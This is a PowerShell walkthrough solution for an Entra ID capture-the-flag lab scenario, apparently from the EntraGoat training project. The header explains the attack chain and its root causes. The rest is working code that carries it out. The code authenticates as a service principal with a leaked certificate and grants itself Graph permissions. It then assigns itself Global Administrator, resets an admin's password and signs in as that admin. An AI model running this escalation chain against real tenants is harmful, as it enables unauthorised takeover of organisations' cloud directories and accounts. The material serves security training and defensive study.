<#
.SYNOPSIS
EntraGoat Scenario 2: Walkthrough solution step-by-step

.DESCRIPTION
________________________________________________________________________________________________________________________________________________
Scenario 2 - From API permissions to directory roles

Attack flow: 

1. The attacker starts as a low-privileged user (Jennifer Clark, Senior Financial Analyst).
A certificate "falls off a truck" during a CI/CD pipeline mishap - basically, as a result of a misconfigured CI/CD pipeline or a careless developer logging sensitive information.

2. The attacker discovers this certificate can authenticate to the SP (and gain its security context).
No brute force needed - just certificate-based authentication.

3. The SP has 'AppRoleAssignment.ReadWrite.All' permission on MS Graph.
This permission is like giving someone the keys to the permission store - they can grant themselves any API permission they want.

4. The attacker grants the SP they control the 'RoleManagement.ReadWrite.Directory' permission.
This permission allows the SP to manage directory roles, including assigning itself administrative roles.

5. The attacker assigns the GA role to any identity they control.
In this solution we assign it to the SP, but it can be done to any user as well.

6. With GA privileges, the attacker resets the target admin's password.

7. The attacker authenticates as the admin user and retrieves the flag.
Mission accomplished through a chain of legitimate API calls, each escalating privileges further.

- - - 

--> So... why this works?
Microsoft Graph API permissions are incredibly powerful, and some combinations create dangerous privilege escalation paths.
'AppRoleAssignment.ReadWrite.All' essentially allows a service principal to grant itself any permission it wants.
When combined with certificate-based authentication (often seen as more "secure"), it creates a perfect storm:

* Certificates don't expire as frequently as passwords
* Certificate-based auth often bypasses conditional access policies
* Service principals with broad permissions are common in automation scenarios
* The 'AppRoleAssignment.ReadWrite.All' permission is often granted without understanding its implications

This scenario highlights how:
- Certificate leakage can be as dangerous as password leakage
- API permissions need careful review and principle of least privilege
- Service principal permissions can create privilege escalation paths
- Automation security practices need improvement (don't log sensitive  information!)

The attack uses only legitimate Microsoft APIs - making it hard to detect without proper monitoring of permission grants and role assignments.
________________________________________________________________________________________________________________________________________________

.NOTES
Requires: Get-MSGraphTokenWithUsernamePassword function from BARK (https://github.com/BloodHoundAD/BARK)
you must have the function/BARK toolkit loaded in PS memory to use this function but other tools (or Connect-MgGraph) can be used as well.
#>

function Find-AppRegistrationByThumbprint {
    param([string]$Thumbprint)
    
    # Get all application registrations and check for matching certificate thumbprint
    $allApps = Get-MgApplication -All
    
    foreach ($app in $allApps) {
        if ($app.KeyCredentials) {
            foreach ($keyCred in $app.KeyCredentials) {
                # Compare thumbprints (certificate matching)
                if ($keyCred.CustomKeyIdentifier) {
                    $credThumbprint = [System.Convert]::ToHexString($keyCred.CustomKeyIdentifier)
                    if ($credThumbprint -eq $Thumbprint) {
                        Write-Host "Certificate match found for: $($app.DisplayName)" -ForegroundColor Green
                        return $app
                    }
                }
            }
        }
    }
    return $null
}


$tenantId = "[YOUR-TENANT-ID]"
$UPN = "jennifer.clark@[YOUR-TENANT-DOMAIN-NAME].onmicrosoft.com"
$password = "GoatAccess!123"

# Certificate details provided by scenario setup (the "leaked" certificate)
$certBase64 = "[PASTE_THE_BASE64_CERTIFICATE_HERE]"
$certPassword = "GoatAccess!123"


# 1. Authentication as low-privileged user (using BARK)
$userToken = Get-MSGraphTokenWithUsernamePassword -Username $UPN -Password $password -TenantID $tenantId
$userAccessToken = $userToken.access_token
$SecureToken = ConvertTo-SecureString $userAccessToken -AsPlainText -Force
Connect-MgGraph -AccessToken $SecureToken

# Verify authentication
Get-MgContext

# Get current user details
$currentUser = Get-MgUser -Filter "userPrincipalName eq '$UPN'"
$currentUser

# decode the base64 certificate to a usable X509Certificate2 object
$certBytes = [System.Convert]::FromBase64String($certBase64)
$cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($certBytes, $certPassword, [System.Security.Cryptography.X509Certificates.X509KeyStorageFlags]::Exportable)

# View certificate details - we can use this to find the app registration it belongs to 
$cert | Select-Object Subject, Issuer, Thumbprint, NotBefore, NotAfter | Format-List

# We can also use the thumbprint hash to query all apps and check their keyCredentials attribute for matching thumbprint in a more automated way
$matchingApp = Find-AppRegistrationByThumbprint -Thumbprint $cert.Thumbprint
$appId = $matchingApp.AppId

# Disconnect user session before authenticating as service principal
Disconnect-MgGraph


# 2. Authenticate as the service principal using the certificate
Connect-MgGraph -ClientId $appId -TenantId $tenantId -Certificate $cert

# Check what permissions we have as the service principal
Get-MgContext 

# Seeing the "AppRoleAssignment.ReadWrite.All" permission is crucial here, as it allows us to modify app role assignments for any service principal - including ourselves!

# To do so, we first need to get MS Graph service principal to find and its ID and the available roles
$graphSP = Get-MgServicePrincipal -Filter "appId eq '00000003-0000-0000-c000-000000000000'"

# Get our service principal details
$sp = Get-MgServicePrincipal -Filter "appId eq '$appId'"
$spId = $sp.Id

# Try to grant ourselves RoleManagement.ReadWrite.Directory permission on MS Graph
$roleManagementRole = $graphSP.AppRoles | Where-Object { $_.Value -eq "RoleManagement.ReadWrite.Directory" }

$appRoleAssignmentParams = @{
    PrincipalId = $spId
    ResourceId = $graphSP.Id
    AppRoleId = $roleManagementRole.Id
}

New-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $spId -BodyParameter $appRoleAssignmentParams

# Step 3. Re-authenticate to ensure the new token includes the updated permissions (Important!)
# you may need to wait a bit for permission to fully propagate, but usually it is quick
Disconnect-MgGraph
Connect-MgGraph -ClientId $appId -TenantId $tenantId -Certificate $cert

Get-MgContext # do you see the new permissions?

# With the RoleManagement.ReadWrite.Directory permission, we can now assign ourselves the GA role
$globalAdminRoleId = "62e90394-69f5-4237-9190-012177145e10"
$globalAdminRole = Get-MgDirectoryRole -Filter "roleTemplateId eq '$globalAdminRoleId'" -ErrorAction SilentlyContinue

$roleMemberParams = @{
    "@odata.id" = "https://graph.microsoft.com/v1.0/servicePrincipals/$spId"
}

New-MgDirectoryRoleMemberByRef -DirectoryRoleId $globalAdminRole.Id -BodyParameter $roleMemberParams

# Step 5. Find the target admin user and reset their password
$targetAdminUPN = "EntraGoat-admin-s2@" + ((Get-MgOrganization).VerifiedDomains | Where-Object IsDefault).Name
$adminUser = Get-MgUser -Filter "userPrincipalName eq '$targetAdminUPN'"
$adminUser

$newPassword = "EntraGoat-$(Get-Date -Format 'yyyyMMdd-HHmmss')!"
$newPassword
$passwordProfile = @{
    Password = $newPassword
    ForceChangePasswordNextSignIn = $false
}

Update-MgUser -UserId $adminUser.Id -PasswordProfile $passwordProfile

Disconnect-MgGraph

# Step 6. Connect as the compromised admin and get the flag
$adminToken = Get-MSGraphTokenWithUsernamePassword -Username $adminUser.UserPrincipalName -Password $newPassword -TenantID $tenantId
$adminAccessToken = $adminToken.access_token
$SecureAdminToken = ConvertTo-SecureString $adminAccessToken -AsPlainText -Force
Connect-MgGraph -AccessToken $SecureAdminToken

# Verify admin authentication
Get-MgContext

# Retrieve flag to prove successful compromise
Invoke-MgGraphRequest -Uri 'https://graph.microsoft.com/v1.0/me?$select=id,userPrincipalName,onPremisesExtensionAttributes' |
    Select-Object @{n='UPN';e={$_.userPrincipalName}},
                  @{n='Id';e={$_.id}},
                  @{n='Flag';e={$_.onPremisesExtensionAttributes.extensionAttribute1}}

Disconnect-MgGraph